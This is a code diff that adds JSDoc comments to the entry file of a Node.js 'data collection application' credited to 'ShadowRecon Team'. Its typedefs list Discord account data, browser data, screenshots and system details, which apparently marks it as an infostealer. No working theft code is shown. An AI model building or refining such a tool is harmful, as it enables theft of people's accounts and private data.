@@ -1,6 +1,26 @@
 /**
- * Main Application Entry Point
- * Clean, modular, and efficient data collection application
+ * @fileoverview Main Application Entry Point
+ * @description Clean, modular, and efficient data collection application
+ * @version 3.0.0
+ * @author ShadowRecon Team
+ * @license MIT
+ */
+
+/**
+ * @typedef {Object} SystemInfo
+ * @property {string} ip - Public IP address
+ * @property {string} hostname - System hostname
+ * @property {string} username - Current username
+ * @property {string} platform - Operating system platform
+ * @property {string} arch - System architecture
+ * @property {string} nodeVersion - Node.js version
+ */
+
+/**
+ * @typedef {Object} CollectionResults
+ * @property {Object} discord - Discord account data
+ * @property {Object} browsers - Browser data collection results
+ * @property {Object} [screenshot] - Screenshot capture result
  */
 
 const { logger } = require('./core/logger');
@@ -11,10 +31,22 @@ const { stats } = require('./core/statistics');
 const { serviceManager } = require('./core/serviceManager');
 const CoreUtils = require('./core/utils');
 
+/**
+ * Main Application Class
+ * Orchestrates the entire data collection workflow
+ * @class Application
+ */
 class Application {
+    /**
+     * Creates an instance of Application
+     * @constructor
+     */
     constructor() {
+        /** @type {boolean} */
         this.initialized = false;
+        /** @type {CollectionResults} */
         this.results = {};
+        /** @type {string|null} */
         this.screenshotPath = null;
         
         // Setup error handlers
@@ -22,7 +54,10 @@ class Application {
     }
 
     /**
-     * Initialize application
+     * Initialize application components and services
+     * @async
+     * @returns {Promise<void>}
+     * @throws {Error} When initialization fails
      */
     async initialize() {
         try {
@@ -51,7 +86,10 @@ class Application {
     }
 
     /**
-     * Collect system information
+     * Collect system information and store in statistics
+     * @async
+     * @returns {Promise<void>}
+     * @private
      */
     async collectSystemInfo() {
         try {
